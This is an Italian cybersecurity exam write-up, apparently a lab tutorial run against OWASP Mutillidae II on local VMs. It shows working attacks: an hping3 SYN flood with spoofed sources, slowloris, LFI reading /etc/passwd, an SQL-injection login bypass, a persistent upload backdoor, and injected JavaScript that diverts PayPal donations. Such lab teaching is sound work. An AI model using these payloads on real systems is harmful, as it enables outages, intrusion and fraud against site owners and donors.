# Esame di Cybersecurity
In questo documento verranno mostrate due macrocategorie di cyber-attacchi:\
**Il primo** è un attacco di tipo DoS, a sua volta suddiviso in:
- Attacco SYN-flood
- Attacco slowloris

**Il secondo** è un attacco APT, nel quale saranno trattati i seguenti attacchi:
- Local file inclusion
- SQL injection (nalla parte di authentication bypass)
- Unrestricted file upload (nella fase di upload della backdoor)
- Stored XSS


## Prima di cominciare..

Per ripetere gli attacchi mostrati in questo documento avremo bisogno di:
- Un hypervisor su cui far girare due VM (come VMWare Workstation Player, gratuitamente scaricabile per usi personali [da qui](https://www.vmware.com/it/products/workstation-player.html))
- Un sistema operativo server (come [Ubuntu Server](https://ubuntu.com/download/server))
- Un sistema operativo client (come [Kali Linux](https://www.kali.org/))

**Una volta scaricato ed installato l'hypervisor sul sistema host, procediamo a creare una macchina virtuale che corrisponderà con il nostro target**\
Sul sistema target andremo ad installare il sistema server, nel caso di esempio il server è stato configurato nel seguente modo:

	server name: testserver
	username: user
	password: password

**Nota:** essendo l'host un sistema operativo Windows, da ora per riferirci al server all'interno della LAN possiamo usare l'indirizzo *testserver.mshome.net*  e sarà Windows di volta in volta a risolvere il nostro dominio con l'IP locale (dinamico) corretto.

Installiamo alcuni package per il webserver e configuriamo l'installazione di mysql:

	sudo apt install apache2 php mysql-server php-curl php-mbstring php-xml php-mysql
	sudo mysql_secure_installation

Ora che abbiamo un webserver funzionante, **passiamo all'installazione della webapp Mutillidae II***, una webapp sviluppata da OWASP come piattaforma di allenamento per pen-tester.\
	* *(configurata con il livello minimo di sicurezza)*

	cd /var/www/html/
	sudo rm index.html
	sudo git clone https://github.com/webpwnized/mutillidae.git
	cd ../
	sudo chown www-data html -R
	sudo chgrp www-data html -R

Una volta clonato il repository di mutillidae ed aver settato proprietario e gruppo della cartella contenente i file pubblici del webserver, modifichiamo con un editor di testo (come *nano* o *vim*) il file di connessione ad database di mutillidae per farlo puntare correttamente al server MySQL precedentemente configurato.

Per controllare il server, inoltre, ci avvarremo del tool **webmin**, che ci consentirà sia di monitorare le risorse in uso sia di configurarlo da remoto con un'interfaccia web.

	wget -q http://www.webmin.com/jcameron-key.asc -O- | sudo apt-key add -
	sudo add-apt-repository "deb [arch=amd64] http://download.webmin.com/download/repository sarge contrib"
	sudo apt install webmin

Al termine dell'installazione, webmin sarà in ascolto sulla porta 10000.

**Passiamo alla configurazione della macchina dell'attacker!**\
La configurazione di quest'ultima macchina è praticamente nulla, procediamo alla creazione di una nuova macchina virtuale ed installiamo il sistema client scaricato in precedenza.

**Prima di continuare**, è necessario effettuare un'ultima operazione sul server per realizzare lo schema del database di Mutillidae, per fare ciò raggiungiamo da un browser l'indirizzo http://testserver.mshome.net/set-up-database.php

**TIP**: siccome le due macchine virtuali hanno bisogno di un canale di comunicazione comune, la scelta migliore è quella di aggiungere su entrambe le VM una scheda NIC che realizzi una connessione diretta tra le due macchine virtuali al fine di evitare che quest'ultima, per avvenire, coinvolga un passaggio inutile attraverso  il router.



## Let's & pwn!
### Attacco DoS
|  | SYN flood | Slowloris
|--|--|--|
| ambisce a saturare le risorse del server| SI | SI
| ambisce a saturare la banda del server| SI | NO
| Livello dello stack TCP/IP | 3 | 4

**Il SYN flooding** si pone al livello di trasporto ma sfrutta una versione "alterata" del protocollo TCP, esso infatti funziona craftando pacchetti raw che a tutti gli effetti sono di tipo SYN, ma poi non completa il three-way handshake, facendo dunque in modo che il server tenga occupata la risorsa relativa alla socket TCP senza che essa venga realmente istanziata lato client *(**nota**: il client a tale scopo può anche spoofare il proprio IP)*.

**Slowloris**, invece, si pone a livello applicativo e dunque c'è bisogno che il client completi il three-way handshake (niente IP spoofing), ma consente ugualmente di saturare risorse del server non completando mai la richiesta HTTP, a tale scopo l'attaccante dopo aver inviato gli header validi (come quello relativo al method, all'host o allo user agent) inizia a mandare, di tanto in tanto, degli header custom (del tipo "X-...") così da tenere attiva la sessione.


#### Attacco SYN Flood: (hping3)
Accediamo al pannello di webmin all'indirizzo: https://testserver.mshome.net:10000/ \
E, da terminale, digitiamo:

	sudo hping3 -S -p 80 --flood --rand-source testserver.mshome.net

Stiamo inviando pacchetti SYN (-S) alla porta 80 (-p 80) in flooding spoofando l'IP di origine.

*Osservando su webmin il grafico relativo al Network I/O, all'avvio dell'attacco esso mostra un aumento significativo delle richieste ma, osservando il grafico dei processi non notiamo variazioni, questo perché le connessioni non vengono completate (manca la ricezione dell'ACK) e dunque non viene istanziato alcun thread di Apache per elaborare la richiesta.
Possiamo verificare che il DoS sia andato a buon fine provando a visitare l'indirizzo testserver.mshome.net e notando che la richiesta va in timeout.*

#### Attacco slowloris: (https://github.com/gkbrk/slowloris)
Per installare slowloris, dal terminale di Kali digitiamo:

	sudo apt install python3-pip
	sudo pip3 install slowloris

Accediamo quindi al pannello di webmin all'indirizzo: https://testserver.mshome.net:10000/ \
E digitiamo, nel terminale:

	slowloris testserver.mshome.net --sockets 2048

*Come possiamo osservare, il grafico dei processi cresce rapidamente per poi stabilizzarsi ad un dato valore, mentre quello relativo al Network I/O presenta degli spikes periodici, questo proprio perché abbiamo avviato tante socket (dunque più thread di apache, dal grafico dei processi) e periodicamente mandiamo dei messaggi di "keep-alive" (come visibile dal grafico relativo alla rete) per tenerle attive.
Possiamo verificare che il DoS sia andato a buon fine provando a visitare l'indirizzo testserver.mshome.net e notando che la richiesta non viene elaborata.*

**TIP:** In entrambi i casi possiamo avviare anche Wireshark (o tshark da console) e osservare effettivamente come sono composti i pacchetti inviati dai due tipi di attacco!

#### Possibili mitigazioni:
Per il **SYN flooding**, alcuni metodi di mitigazione sono i seguenti:
- si può aumentare la capacità della coda di Backlog (le connessioni semi-aperte gestite dal sistema);
- si può applicare una politica di tipo round robin sulla coda di Backlog (quando quest'ultima è piena, la prossima connessione che si viene a creare va a sovrascrivere la più vecchia, questa mitigazione si basa sull'idea che una connessione lecita è completata prima di una connessione dovuta ad un DoS);
- SYN Cookies: il server anziché memorizzare il SYN in una coda, codifica all'interno del numero di sequenza inviato al client nel SYN-ACK delle informazioni che gli consentiranno di ricostruire il three-way handshake quando il client risponderà con l'ACK.

Per l'attacco **Slowloris**, invece, delle possibili mitigazioni sono:
- Aumentare il numero di connessioni in ingresso che il webserver ammette;
- Limitare il numero di connessioni che un determinato IP può tenere aperte contemporaneamente;
- Ridurre il tempo necessario affinché una richiesta vada in timeout.

### APT (Advanced persistent threat, minaccia avanzata persistente):
Un attacco di questo tipo, a differenza di un DoS, ha l'obiettivo di rimanere nascosto per il più lungo periodo di tempo possibile al fine di trovare informazioni riservate.
Generalmente un APT è un attacco composto da diversi attacchi strutturati in un modo ben preciso.

*Le fasi in cui è diviso un APT sono le seguenti:* \
![fasi di un attacco APT](https://upload.wikimedia.org/wikipedia/commons/7/73/Advanced_persistent_threat_lifecycle.jpg)

Un esempio di come è strutturato un APT è il seguente:
1) Definizione dell'obiettivo che si vuole raggiungere
2) Studio della superficie d'attacco
3) Individuazione di informazioni più o meno riservate che ci possano facilitare l'infiltrazione all'interno della società/organizzazione target (sia mediante tool di OSINT come, ad esempio, [MALTEGO](https://www.maltego.com/), sia attraverso tecniche di Social Engineering)
4) Infiltrazione iniziale nel sistema (installando ad esempio una backdoor)
5) Priviledge Escalation
6) Espansione della superficie controllata (avendo cura di nascondere le tracce del proprio passaggio)
7) Portare a termine l'obiettivo prefissato, come ad esempio "estrarre" dati ed informazioni riservate (password, segreti industriali,...) 

*Un esempio di APT è dato dal noto caso [Stuxnet](https://en.wikipedia.org/wiki/Stuxnet), un APT diffuso dai governi USA e di Israele per sabotare una centrale nucleare iraniana.*

#### Esempio di APT
**Obiettivo:** vogliamo modificare il pulsante di donazione su di un sito web affinché le donazioni anziché arrivare alla vittima siano versate su di un conto controllato dall'attacker!\
\
Nel nostro caso, che sarà una versione semplificata di un APT avente il solo scopo di coprire alcune delle vulnerabilità più frequenti nelle applicazioni web, considereremo dato lo studio della superficie di attacco e ci soffermeremo solo sui punti 1, 4, 6 e 7.\
\
Supponendo dunque di aver già analizzato la surface area del target e di avere individuato di conseguenza degli attack vector che ci consentono di raggiungere il nostro obiettivo, passiamo all'azione:\
\
**Passo 1: Local file inclusion**\
Abbiamo individuato che è facilmente exploitabile una vulnerabilità di tipo LFI modificando il parametro page nella chiamata GET al sito.\
\
Il link alla home page si presenta nel seguente modo: http://testserver.mshome.net/index.php?page=home.php \
\
Cosa succede se modifichiamo l'URL in http://testserver.mshome.net/index.php?page=/etc/passwd ?\
\
Il server ci restituisce l'elenco degli user presenti nel sistema! (*Information disclosure*)\
Con questa security weakness al momento non possiamo ottenere degli accessi al sistema, in quanto non abbiamo i privilegi sufficienti per leggere il file shadow per procedere con il cracking delle password ma teniamola da parte, perché ci potrà servire in seguito!\
\
**Passo 2: Authentication Bypass**\
Abbiamo scoperto che esiste un account admin e che sul form di login è possibile effettuare una SQL injection, *procediamo dunque ad effettuare il login*!

	username: "admin' AND 1 = 1; -- " (SENZA virgolette)
	password: [qualsiasi cosa]

Abbiamo individuato, tramite ad esempio una tecnica di social engineering o un più semplice attacco a dizionario, un utente che potenzialmente possiede i diritti amministrativi ma non ne conosciamo la password;\
Abbiamo però trovato una vulnerabilità che ci consente di effettuare una authentication bypass mediante SQL injection!\
La webapp effettua la seguente query al database per validare l'accesso, passando dei parametri inviati dal client e non sanitizzati:

	"SELECT username FROM accounts WHERE username='$username' AND password='$password'"

Con i parametri che abbiamo fornito poc'anzi, abbiamo craftato la seguente query:

	SELECT username FROM accounts WHERE username='admin' AND 1 = 1; -- ' AND password='[qualsiasi cosa]'

Equivalente a (il simbolo -- in SQL identifica un commento):

	SELECT username FROM accounts WHERE username='admin' AND 1 = 1;

-> Possiamo impersonificare qualsiasi utente conoscendone solo l'username!\
\
**Passo 3: Installazione della backdoor**\
Una volta loggati nella webapp come admin, abbiamo la possibilità di caricare files sul server all'indirizzo http://testserver.mshome.net/index.php?page=upload-file.php \
*(In realtà, su Mutillidae, questa pagina è accessibile anche senza effettuare il login, ma in uno scenario più verosimile una pagina analoga richiederebbe un accesso privilegiato)*\
Il processo di upload è affetto da una security weakness che ci consente di caricare qualsiasi file sul server (Unrestricted file upload)\
\
Una volta effettuato l'upload della backdoor, il server risponde informandoci che essa è stata caricata in /tmp/list.php, dunque (al momento) non è persistente, per accedervi usiamo la vulnerabilità al punto 1:\
http://testserver.mshome.net/index.php?page=/tmp/list.php \
E, utilizzando la backdoor stessa, carichiamola nella root del webserver (*/var/www/html*) per renderla persistente.\
\
*ora la backdoor sarà accessibile da http://testserver.mshome.net/list.php e la sua possibile esecuzione non dipenderà più dal fatto che la vulnerabilità sfruttata sia presente sul server!*\
\
**Passo 4: LETZ PWN!!1!11!!**\
Iniettiamo del codice nella webapp per effettuare la modifica dell'indirizzo di destinazione della donazione:\
La nostra intenzione è quella di modificare il contenuto del tag di input con name hosted_button_id, cambiando il valore da 45R3YEXENU97S (che corrisponde al codice Paypal di Mutillidae) a 573V3NS0 (il nostro ipotetico codice di Paypal);\
A tale scopo possiamo agire iniettando uno script javascript che modifichi il DOM, senza dunque modificare questo parametro nella pagina originale/nel record del database dov'é memorizzato.\
Procediamo dunque ad effettuare il download del file di index.php tramite la backdoor precedentemente caricata ed iniettiamo il seguente frammento di codice alla fine del file:

	<script>window.addEventListener("load",function(){document.getElementsByName("hosted_button_id")[0].setAttribute("value","573V3NS0");});</script>

Dalla backdoor aggiorniamo il file index.php con quello appena modificato ed aggiorniamo la pagina per verificare che la modifica apportata sia funzionante.\
\
***Pwn completato con successo!***

-------------
Dimostrazione disponibile in /demonstration
